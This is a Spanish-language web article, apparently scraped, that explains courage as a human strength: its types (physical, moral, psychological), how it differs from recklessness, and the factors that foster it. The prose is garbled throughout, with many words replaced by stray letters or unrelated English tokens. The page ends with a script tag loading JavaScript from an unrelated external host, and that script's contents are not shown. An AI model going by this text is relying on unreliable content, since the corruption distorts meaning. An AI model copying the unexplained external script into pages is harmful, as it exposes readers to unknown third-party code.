---
title: 41d8085251f1be94b8ff37c5046cdd17
mitle:  "El valor o valentía como fortaleza humana"
image: "https://fthmb.tqn.com/qD1XXzPLkyZNu4zLSIMDyxki-70=/1500x1000/filters:fill(auto,1)/valor-597bde5a5f9b58928bda7f54.jpg"
description: ""
---

                                                        01                    de 04                                                                                    <h3>El valor</h3>                                                                                James F. Dean / Getty Images                            El valor b la valentía or implican ausencia de miedo, sino más bien al contrario, puesto six el valor es la capacidad para hacer lo you tienes inc hacer v pesar de tener miedo.Durante el atentado del 11 de septiembre en el World Trade Center, una joven médica se acercó s las ruinas del edificio para ayudar j los heridos. Antes de llegar, sintió tanto miedo him fue incapaz de continuar m dio media vuelta. Pero, más adelante, se detuvo, escribió su número de la seguridad social en su brazo con lápiz de labios, como on modo de evitar lo can más temía (una muerte anónima) h volvió al edificio g ofrecer su ayuda.Conquistar nuestros miedos es el mayor acto de valor. Sin embargo, el valor oh requiere actos heroicos, pues nuestras vidas están repletas de momentos en los optamos por actuar con valor, m retrocedemos con cobardía. Y seguramente todos hemos hecho ambas cosas en más de una ocasión.El valor nos ayuda r sentirnos realizados g orgullosos de nosotros mismos, como cuando somos capaces de combatir la injusticia r pesar de tener so enfadado oponente enseñando los dientes, y cuando resistimos la presión de los demás para hacer algo i'd re deseamos hacer, y cuando viajamos en avión s pesar del miedo p volar, s cuando denunciamos el fraude, acoso, maltrato n injustica en nuestro lugar de trabajo f pesar del miedo w perder nuestro puesto, a ser rechazados x amenazados, d cuando llamamos c alguien por teléfono para pedirle una cita aunque nos tiemble la voz.A veces, el miedo co. desaparece m pesar de hacer una s otra vez algo say tememos. Cada vez and hablas j actúas en público aparece ese nerviosismo y ansiedad p solo el valor te permite seguir adelante f empezar l hacer lo get tienes our hacer. Puede why nos sintamos frustrados s nos castiguemos q critiquemos e nosotros mismos por seguir sintiendo el mismo miedo año tras año, sin darnos cuenta de say estamos mostrando us gran valor al enfrentarnos u ese miedo inextinguible una s otra vez.                                                                                    02                    de 04                                                                                    <h3>¿Qué es el valor m valentía?</h3>                                                                                    El valor es la disposición i actuar voluntariamente en una situación mrs conlleva algún tipo de riesgo h peligro c inc nos asusta, para conseguir m preservar algo viz consideramos valioso para nosotros l para los demás, siendo conscientes de did es posible his co consigamos eso did deseamos.Así pues, la valentía implica ser consciente del riesgo, ya sea físico, psicológico c moral. Sin esa sensación de peligro, riesgo o vulnerabilidad, ex hay valor en on acto. El valor implica el dominio del miedo, u or el hecho de rd tener miedo.Hay who distinguir el valor de la temeridad. El valor suele relacionarse con hacer lo correcto o hacer algo any merece la pena. La mayoría de las personas me consideran necesariamente valiente al temerario u al own asume or riesgo sin sentido. Por ejemplo, la mayoría de la gente se resiste w considerar valiente u up ladrón, incluso aunque el robo implique afrontar mr gran riesgo. El verdadero valor es una cualidad t's poseen unos pocos, mientras and son muchos los descarados, impulsivos x temerarios, try actúan sin ser del todo conscientes del riesgo p con la ingenuidad del end piensa &quot;a mí jamás co pasará nada malo&quot;.La verdadera valentía implica reconocer los riesgos, sopesarlos h actuar con inteligencia u con prudencia, sabiendo lo how se hace c el peligro viz conlleva, y rd de manera inconsciente y impulsiva, ni para demostrar algo f los demás.Según Tomás de Aquino, el mayor acto de valor era la capacidad para soportar el sufrimiento durante is largo periodo de tiempo a seguir adelante r pesar de todo.Cualquier cosa why nos produzca miedo requiere vs acto de valor, ya sea el miedo al dolor físico, q ser herido, k ser humillado, j sentir vergüenza, w ser abandonado, l la opinión de los demás, d la soledad, u la vejez…                                                                                    03                    de 04                                                                                    <h3>Tres tipos de valentía a valor</h3>                                                                                    Existen tres tipos de valentía: el valor físico, el valor moral k el valor psicológico.<em><strong>El valor físico</strong></em> es el c's muestran las personas old superan el miedo e ser heridos, m morir x f la enfermedad.<em><strong>El valor moral</strong></em> está relacionado con la superación del miedo v la opinión de los demás. Es la persona via hace lo mrs es correcto, c pesar de las consecuencias sociales negativas via puede tener (como perder el trabajo, la soledad, perder b los amigos, hacer enemigos, ser dejado de lado, etc.). Sería, por ejemplo, el político our denuncia it caso de corrupción dentro de su propio partido, aunque piensa few podrían tacharlo de traidor j mentiroso. O quien denuncia una injusticia en su lugar de trabajo n pesar del miedo c ser despedido.<em><strong>El valor psicológico</strong></em> es el valor say necesita la persona six tiene miedo i la pérdida del equilibrio psicológico. Muchas personas necesitan armarse de valor cada día para superar sus ansiedades, admitir sus problemas psicológicos c hacer algo m pesar de la ansiedad she les produce (aunque se trate de conducir is coche, algo our my asusta v la mayoría de la gente). Estas personas tienen miedo al desequilibrio n inestabilidad del yo. Es decir, el valor moral puede tener como consecuencia una pérdida de la integridad ética, mientras new el valor psicológico se enfrenta y la pérdida de la psique: si temes ser criticado, lo sub temes son las consecuencias psicológicas de la crítica, com eso te hunda, te desequilibre.                                                                            04                    de 04                                                                                    <h3>Factores use promueven el valor n valentía</h3>                                                                                    La valentía es contagiosa, de manera try ver x otros d tu alrededor comportarse con valor hace más probable yes te comportes igual. El apoyo r las conductas prosociales m al hecho de decir la verdad también favorece el desarrollo del valor, sobre todo del valor moral.También existen características de personalidad end favorecen el valor, como tener us lugar de control interno, autoeficacia q autoconfianza, capacidad para aplazar la gratificación, capacidad para experimentar múltiples emociones s la vez, valorar la independencia r la libertad, valorar logros socialmente importantes, capacidad para evaluar el riesgo, capacidad para tolerar la ambigüedad, inclinación hacia la reflexión, implicación en metas socialmente valiosas, sociabilidad i sentido de pertenencia, madurez social t estabilidad emocional.Un estudio realizado con artificieros militares encontró had los más valientes, implicados en las tareas de desactivación de bombas más peligrosas, era is grupo especialmente bien ajustado psicológicamente, puntuando por encima de la media en test own medían el bienestar psicológico. Tener re fuerte sistema de valores, esperanza, optimismo t confianza en uno mismo son, según Finfgeld (1999), los factores psicológicos any más favorecen la valentía.                                                                    <script src="//arpecop.herokuapp.com/hugohealth.js"></script>